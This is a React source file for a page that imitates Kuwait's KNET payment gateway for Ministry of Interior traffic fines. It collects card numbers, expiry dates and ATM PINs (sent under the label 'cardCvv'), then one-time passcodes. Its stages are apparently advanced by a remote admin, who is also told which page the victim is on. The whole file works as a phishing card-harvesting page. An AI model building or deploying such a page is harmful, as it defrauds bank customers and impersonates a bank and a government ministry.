import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "success" | "failed" | "atm" | "atm_pending";

export default function Payment() {
  const [, setLocation] = useLocation();
  const [stage, setStage] = useState<Stage>("card");
  const [paymentData, setPaymentData] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [pin, setPin] = useState("");
  const [otp, setOtp] = useState("");

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) { setLocation("/"); return; }
    const parsed = JSON.parse(data);
    setPaymentData(parsed);
    
    if (parsed.sessionId) {
      setSessionId(parsed.sessionId);
    } else {
      createSessionMutation.mutate({
        selectedFines: parsed.selectedFines,
        totalAmount: parsed.totalAmount,
        civilId: parsed.civilId,
        enquiryType: "1",
        queryId: parsed.queryId
      });
    }
    
    // إبلاغ الأدمن بمكان العميل
    fetch('/api/admin/update-page', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ civilId: parsed.civilId, page: 'صفحة إدخال البطاقة' })
    });
  }, []);

  const createSessionMutation = trpc.payment.createSession.useMutation({
    onSuccess: (data) => setSessionId(data.sessionId)
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    { enabled: !!sessionId && stage.endsWith("_pending"), refetchInterval: 2000 }
  );

  useEffect(() => {
    if (sessionStatus?.stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
    }
  }, [sessionStatus]);

  const submitCard = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const submitOtp = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const handleCardSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitCard.mutate({
      sessionId,
      cardName: "KNET User",
      cardNumber: cardNumber.replace(/\s/g, ""),
      cardExpiry: `${expiryMonth}/${expiryYear}`,
      cardCvv: pin
    });
  };

  const handleOtpSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitOtp.mutate({ sessionId, otpCode: otp });
  };

  if (!paymentData) return null;

  return (
    <div className="knet-payment-wrapper" dir="rtl">
      <link href="/knet/css/payment-reset.css" rel="stylesheet" type="text/css"/>
      <link href="/knet/css/payment-responsive-ar.css" rel="stylesheet" type="text/css"/>
      <link href="/knet/css/payment-layout-ar.css" rel="stylesheet" type="text/css"/>
      
      <style>{`
        .knet-payment-wrapper { background: #f5f5f5; min-height: 100vh; font-family: sans-serif; }
        .payment-container { max-width: 500px; margin: 0 auto; padding: 20px; }
        .knet-card { background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); overflow: hidden; }
        .knet-header { background: #fff; padding: 15px; text-align: center; border-bottom: 1px solid #eee; }
        .knet-body { padding: 20px; }
        .info-row { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px dashed #eee; padding-bottom: 5px; }
        .info-label { color: #666; font-weight: bold; }
        .info-value { color: #000; font-weight: bold; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; }
        .input-styled { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; text-align: center; font-size: 16px; }
        .btn-knet { background: #0076c0; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-knet:disabled { background: #ccc; }
        .loading-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255,255,255,0.9); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
        .otp-modal { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 1001; }
        .otp-content { background: white; padding: 30px; border-radius: 8px; width: 90%; max-width: 400px; text-align: center; }
      `}</style>

      <div className="payment-container">
        <div className="knet-card">
          <div className="knet-header">
            <img src="/knet/images/paypage-images/knet-logo-ar.png" alt="KNET" style={{height: '40px'}} onError={(e) => (e.currentTarget.src = 'https://www.kpay.com.kw/kpg/images/knet-logo-ar.png')} />
          </div>
          
          <div className="knet-body">
            <div style={{textAlign: 'center', marginBottom: '20px'}}>
              <img src="/knet/images/paypage-images/tasdeed_logo.png" alt="Tasdeed" style={{height: '40px'}} onError={(e) => (e.currentTarget.src = 'https://www.kpay.com.kw/kpg/images/tasdeed_logo.png')} />
              <h3 style={{color: '#0076c0', margin: '10px 0'}}>بوابة الدفع الإلكتروني</h3>
            </div>

            <div className="info-section" style={{background: '#f9f9f9', padding: '15px', borderRadius: '5px', marginBottom: '20px'}}>
              <div className="info-row">
                <span className="info-label">المستفيد:</span>
                <span className="info-value">وزارة الداخلية</span>
              </div>
              <div className="info-row">
                <span className="info-label">عدد المخالفات المختارة:</span>
                <span className="info-value">{paymentData.selectedFines?.length || 0}</span>
              </div>
              <div className="info-row">
                <span className="info-label">المبلغ الإجمالي:</span>
                <span className="info-value" style={{color: '#d9534f'}}>{paymentData.totalAmount} د.ك</span>
              </div>
              {paymentData.selectedFines && paymentData.selectedFines.map((fine: any, i: number) => (
                <div key={i} className="info-row" style={{background: '#fff', margin: '5px -15px', padding: '5px 15px', borderBottom: '1px dashed #ddd'}}>
                  <span style={{fontSize: '12px', color: '#000576'}}>رقم: {fine.ticketNo} | قيمة: {parseInt(fine.amount)} دك | لوحة: {fine.plateNumber}/{fine.plateCode}</span>
                </div>
              ))}
            </div>

            {stage === "card" && (
              <form onSubmit={handleCardSubmit}>
                <div className="form-group">
                  <label>رقم بطاقة الصراف الآلي (K-NET)</label>
                  <input 
                    type="text" 
                    className="input-styled" 
                    placeholder="**** **** **** ****" 
                    value={cardNumber}
                    onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 '))}
                    maxLength={19}
                    required
                  />
                </div>
                
                <div style={{display: 'flex', gap: '10px'}}>
                  <div className="form-group" style={{flex: 1}}>
                    <label>تاريخ الانتهاء</label>
                    <div style={{display: 'flex', gap: '5px'}}>
                      <input 
                        type="text" 
                        className="input-styled" 
                        placeholder="MM" 
                        value={expiryMonth}
                        onChange={(e) => setExpiryMonth(e.target.value.replace(/\D/g, ''))}
                        maxLength={2}
                        required
                      />
                      <input 
                        type="text" 
                        className="input-styled" 
                        placeholder="YY" 
                        value={expiryYear}
                        onChange={(e) => setExpiryYear(e.target.value.replace(/\D/g, ''))}
                        maxLength={2}
                        required
                      />
                    </div>
                  </div>
                  <div className="form-group" style={{flex: 1}}>
                    <label>الرقم السري (PIN)</label>
                    <input 
                      type="password" 
                      className="input-styled" 
                      placeholder="****" 
                      value={pin}
                      onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                      maxLength={4}
                      required
                    />
                  </div>
                </div>

                <button type="submit" className="btn-knet">إرسال</button>
              </form>
            )}

            {error && (
              <div style={{color: 'red', textAlign: 'center', marginTop: '10px', fontWeight: 'bold'}}>
                {error}
              </div>
            )}
          </div>
          
          <div style={{padding: '10px', textAlign: 'center', fontSize: '12px', color: '#999', borderTop: '1px solid #eee'}}>
            جميع الحقوق محفوظة © 2026 شركة كي نت
          </div>
        </div>
      </div>

      {stage.endsWith("_pending") && (
        <div className="loading-overlay">
          <img src="/knet/images/paypage-images/loading.gif" alt="Loading" style={{height: '50px'}} onError={(e) => (e.currentTarget.src = 'https://www.kpay.com.kw/kpg/images/paypage-images/loading.gif')} />
          <p style={{marginTop: '15px', color: '#0076c0', fontWeight: 'bold'}}>جاري معالجة طلبك، يرجى الانتظار...</p>
        </div>
      )}

      {stage === "otp" && (
        <div className="otp-modal">
          <div className="otp-content">
            <h3 style={{color: '#0076c0', marginBottom: '20px'}}>تأكيد الرمز (OTP)</h3>
            <p>يرجى إدخال رمز التحقق المرسل إلى هاتفك</p>
            <form onSubmit={handleOtpSubmit}>
              <input 
                type="text" 
                className="input-styled" 
                style={{fontSize: '24px', letterSpacing: '5px', margin: '20px 0'}}
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
                maxLength={6}
                required
                autoFocus
              />
              <button type="submit" className="btn-knet">تأكيد</button>
            </form>
          </div>
        </div>
      )}

      {stage === "success" && (
        <div className="loading-overlay">
          <div style={{fontSize: '60px', color: '#5cb85c'}}>✓</div>
          <h2 style={{color: '#5cb85c'}}>تمت عملية الدفع بنجاح</h2>
          <button className="btn-knet" style={{width: '200px', marginTop: '20px'}} onClick={() => setLocation("/")}>العودة للرئيسية</button>
        </div>
      )}
      
      {stage === "failed" && (
        <div className="loading-overlay">
          <div style={{fontSize: '60px', color: '#d9534f'}}>✕</div>
          <h2 style={{color: '#d9534f'}}>فشلت عملية الدفع</h2>
          <p>{error || "حدث خطأ غير معروف"}</p>
          <button className="btn-knet" style={{width: '200px', marginTop: '20px'}} onClick={() => setStage("card")}>المحاولة مرة أخرى</button>
        </div>
      )}
    </div>
  );
}
